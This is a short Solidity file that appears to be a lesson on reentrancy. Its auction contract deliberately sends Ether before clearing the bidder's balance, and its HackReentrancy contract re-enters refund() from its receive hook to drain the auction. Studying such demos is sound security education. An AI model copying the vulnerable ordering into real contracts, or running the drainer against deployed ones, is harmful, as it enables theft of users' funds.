// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;


contract AuctionReentrancy {
    mapping(address bidder => uint bid) public bids;

    function bid() external payable {
        bids[msg.sender] +=msg.value;
    }

    //It's a pull pattern
    function refund() external {
        uint refundAmount = bids[msg.sender];

        if(refundAmount > 0) {

            //Good practice. Reentracny is not possible with this code;
            //bids[msg.sender] -= refundAmount;
            
            (bool ok,) = msg.sender.call{value: refundAmount}("");
            require(ok, "can't send");
            //Bad Idea!!! All funds can be stolen by reentrancy attack
            bids[msg.sender] = 0; 

            //Ok to do this
            //bids[msg.sender] -= refundAmount;
        }
    }
}

contract HackReentrancy {
    AuctionReentrancy toHack;
    uint constant BID_AMOUNT = 1 ether;

    constructor(address _toHack) payable {
        require(msg.value == BID_AMOUNT);

        toHack = AuctionReentrancy(_toHack);
        toHack.bid{value: msg.value}();
    }

    function hack() public {
        toHack.refund();
    }

    receive() external payable {
        if(address(toHack).balance >= BID_AMOUNT) {
            hack();
        }
    }
}